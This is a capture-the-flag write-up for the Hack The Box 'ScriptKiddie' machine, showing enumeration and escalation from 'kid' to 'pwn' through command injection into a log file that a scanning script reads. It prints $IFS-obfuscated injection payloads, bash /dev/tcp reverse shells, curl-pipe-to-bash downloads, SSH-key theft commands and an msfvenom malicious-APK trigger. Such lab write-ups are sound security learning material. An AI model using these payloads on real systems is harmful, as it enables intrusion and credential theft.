# Shell as kid

I first tried upgrading my shell. The default terminal seemed to be `/bin/sh`:

![[Pasted image 20210612144401.png]]

We can also grab the user flag:

![[Pasted image 20210612144448.png]]

`kid` has an SSH directory, so we can write a key if we want to:

```bash

[on host]
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/ssh]
└─$ ssh-keygen -f scriptkiddie

[on kid]
echo 'ssh-rsa A..[rest of scriptkiddie.pub]..8= mac@kali' >> .ssh/authorized_keys

[on host]
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/ssh]
└─$ ssh -i scriptkiddie kid@10.10.10.226
```

## Basic Enumeration

I checked the home directory out:

```bash
$ ls -la
total 60
drwxr-xr-x 11 kid  kid  4096 Feb  3 11:49 .
drwxr-xr-x  4 root root 4096 Feb  3 07:40 ..
lrwxrwxrwx  1 root kid     9 Jan  5 20:31 .bash_history -> /dev/null
-rw-r--r--  1 kid  kid   220 Feb 25  2020 .bash_logout
-rw-r--r--  1 kid  kid  3771 Feb 25  2020 .bashrc
drwxrwxr-x  3 kid  kid  4096 Feb  3 07:40 .bundle
drwx------  2 kid  kid  4096 Feb  3 07:40 .cache
drwx------  4 kid  kid  4096 Feb  3 11:49 .gnupg
drwxrwxr-x  3 kid  kid  4096 Feb  3 07:40 .local
drwxr-xr-x  9 kid  kid  4096 Feb  3 07:40 .msf4
-rw-r--r--  1 kid  kid   807 Feb 25  2020 .profile
drwx------  2 kid  kid  4096 Feb 10 16:11 .ssh
-rw-r--r--  1 kid  kid     0 Jan  5 11:10 .sudo_as_admin_successful
drwxrwxr-x  5 kid  kid  4096 Jun 12 13:39 html
drwxrwxrwx  2 kid  kid  4096 Feb  3 07:40 logs
drwxr-xr-x  3 kid  kid  4096 Feb  3 11:48 snap
-r--------  1 kid  kid    33 Jun 12 11:49 user.txt
$ cd logs
$ ls -la
total 8
drwxrwxrwx  2 kid kid 4096 Feb  3 07:40 .
drwxr-xr-x 11 kid kid 4096 Feb  3 11:49 ..
-rw-rw-r--  1 kid pwn    0 Jun 12 12:43 hackers
```

There was a `logs` directory, with a `hackers` file owned by the `pwn`user, which was empty.

I wondered if trying to 'hack' the site updated the file:

![[Pasted image 20210612144729.png]]

It didn't seem to change.

I checked `/etc/passwd` for other users:

```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
kid:x:1000:1000:kid:/home/kid:/bin/bash
pwn:x:1001:1001::/home/pwn:/bin/bash
```

The only other 'real' user was `pwn`.

I looked for files owned by `kid`:

```bash
$ find / -user kid 2>/dev/null
...[proc]...
/home/kid/.ssh
/home/kid/.ssh/authorized_keys
/home/kid/user.txt
/home/kid/logs
/home/kid/logs/hackers
/tmp/hsperfdata_kid
/tmp/hellothere.sh
/tmp/tmpxd8fhlry.apk
...[var]...
```

And for files in our group:

```bash
$ find / -group kid 2>/dev/null | grep -Ev 'proc|var|sys|run|cache|snap|gnupg'
/home/kid
/home/kid/.bash_logout
/home/kid/.local
/home/kid/.local/share
/home/kid/.local/share/apktool
/home/kid/.local/share/apktool/framework
/home/kid/.local/share/apktool/framework/1.apk
/home/kid/.bashrc
/home/kid/.sudo_as_admin_successful
/home/kid/html
/home/kid/html/app.py
/home/kid/html/static
/home/kid/html/static/hacker.css
/home/kid/html/static/payloads
/home/kid/html/static/payloads/2a8c154d3f36.exe
/home/kid/html/hackers
/home/kid/html/templates
/home/kid/html/templates/index.html
/home/kid/.bash_history
/home/kid/.profile
/home/kid/.msf4
/home/kid/.msf4/local
/home/kid/.msf4/logos
/home/kid/.msf4/store
/home/kid/.msf4/store/modules_metadata.json
/home/kid/.msf4/loot
/home/kid/.msf4/plugins
/home/kid/.msf4/modules
/home/kid/.msf4/logs
/home/kid/.msf4/logs/sessions
/home/kid/.msf4/logs/production.log
/home/kid/.msf4/logs/framework.log
/home/kid/.bundle
/home/kid/.ssh
/home/kid/.ssh/authorized_keys
/home/kid/user.txt
/home/kid/logs
/home/kid/logs/hackers
/tmp/hsperfdata_kid
/tmp/lkyv
/tmp/lkwi
/tmp/wqin
/tmp/brzwl
```

And for files owned by `pwn`:

```bash
$ find / -user pwn 2>/dev/null
/home/pwn
/home/pwn/recon
/home/pwn/.bash_logout
/home/pwn/.local
/home/pwn/.local/share
/home/pwn/.selected_editor
/home/pwn/.bashrc
/home/pwn/.cache
/home/pwn/.profile
/home/pwn/.ssh
/home/pwn/scanlosers.sh
```

`/home/pwn/scanlosers.sh` looks interesting. Let's see what's inside:

```bash
$ cat /home/pwn/scanlosers.sh
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

It looks like it takes whatever IPs are in the `hackers` file and runs `nmap` against them, then wipes the file. We can see if we can catch this behaviour in `pspy`:

```bash
$ cd /tmp
$ wget http://10.10.16.211:8000/pspy64
--2021-06-12 14:01:38--  http://10.10.16.211:8000/pspy64
Connecting to 10.10.16.211:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.94M  1.27MB/s    in 2.3s    

2021-06-12 14:01:40 (1.27 MB/s) - ‘pspy64’ saved [3078592/3078592]

$ chmod +x pspy64
$ ./pspy64
```

Sure enough, when we submit `;id` to the searchsploit field we see our IP being scanned:

![[Pasted image 20210612145609.png]]

We can also see some sort of other CRON-based automation, running as root. We can read `/etc/crontab` to see this:

```bash
$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

So, it looks like some sort of automation is reading the hackers file. If we insert a malicious 'ip address' into the file, it will be read by `pwn` and executed as part of the `nmap` command.

However, the script cuts based on spaces. So we can try to insert a payload that doesn't have spaces, using the $IFS character:

```bash
;/bin/bash$IFS-c$IFS'bash$IFS-i$IFS>&$IFS/dev/tcp/10.10.16.211/9001$IFS0>&1'#
```

This should end the `nmap` command with a semicolon, execute our command, then comment the rest out.

Echoing it to the file, however, gives us no results:

```
kid@scriptkiddie:~/logs$ echo ";/bin/bash$IFS-c$IFS'bash$IFS-i$IFS>&$IFS/dev/tcp/10.10.16.211/9001$IFS0>&1'#" >> hackers
```

I wondered if it was getting cleared extremely quickly after being written, so I tried to both echo to it and submit `;id` to trigger the scanning at the same time:

![[Pasted image 20210612151527.png]]

We can see the scan on our IP, but not our malicious payload.

I tried editing the file just to make sure I had permissions. This time, the edit showed up in the log:

![[Pasted image 20210612151628.png]]

So it looks like writing with `nano` works. Cool!

Now we just need to add our real payload:

![[Pasted image 20210612151702.png]]

This time we see the injected code:

![[Pasted image 20210612151738.png]]

But the shell immediately dies, just like before!

![[Pasted image 20210612151801.png]]

So... why not reuse the payload that eventually worked?

```bash
curl http://10.10.16.211/rev.sh | bash
```

This payload becomes:

```bash
;curl$IFShttp://10.10.16.211/rev.sh$IFS|$IFSbash#
```

Sending it off, we see the injection but no code execution:

![[Pasted image 20210612152324.png]]

And no hit on our python server:

![[Pasted image 20210612153059.png]]

So I added the `/bin/bash -c` prefix:

```bash
;/bin/bash$IFS-c$IFS'curl$IFShttp://10.10.16.211/rev.sh$IFS|$IFSbash'#
```

However, I didn't get anything back. It seems to delete the single quotes from the payload, which may be breaking the command:

![[Pasted image 20210612152841.png]]

I tried a few payloads here, including with both `$IFS` and `${IFS}`:
- `;echo$IFS"bash${IFS}-i${IFS}>&${IFS}/dev/tcp/10.10.16.211/9001${IFS}0>&1"$IFS>$IFS/home/pwn/rev;$IFS/home/pwn/rev#` to create and execute a staged payload
- `;cp${IFS}/home/pwn/.ssh/id_rsa${IFS}/home/pwn/;${IFS}chmod${IFS}777${IFS}/home/pwn/id_rsa#` to copy `pwn`'s SSH key and make it readable
- `;echo${IFS}"ssh-rsa${IFS}AA...[snip]...38="${IFS}>${IFS}/home/pwn/.ssh/authorized_keys#` to write an SSH key

Eventually, I had the idea to reuse the exploit from before, and manually execute a malicious APK!

I copied across the APK that excecutes the reverse shell using `curl`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/www]
└─$ cp /tmp/tmp056ul9j3/evil.apk .
┌──(mac㉿kali)-[~/Documents/HTB/scriptkiddie/www]
└─$ mv evil.apk exec-rev.apk
```

Then I started a python server to serve up both `exec-rev.apk` and `rev.sh` on port 80, and executed the command to download the apk:

```bash
;wget${IFS}http://10.10.16.211/exec-rev.apk#
```

![[Pasted image 20210612160656.png]]

This hit my server (twice, strangely):

![[Pasted image 20210612160716.png]]

Then I had to make it execute the malicious apk. I used this command:

```bash
;msfvenom${IFS}-x${IFS}/home/pwn/exec-rev.apk${IFS}-p${IFS}android/meterpreter/reverse_tcp${IFS}LHOST=127.0.0.1${IFS}LPORT=4444${IFS}-o${IFS}/dev/null#
```

(I used `find` to get the path):

```bash
kid@scriptkiddie:~/logs$ find / -name "exec-rev.apk" 2>/dev/null
/home/pwn/exec-rev.apk
```

It executed:

![[Pasted image 20210612161536.png]]

And gave me a shell as `pwn`!

![[Pasted image 20210612161610.png]]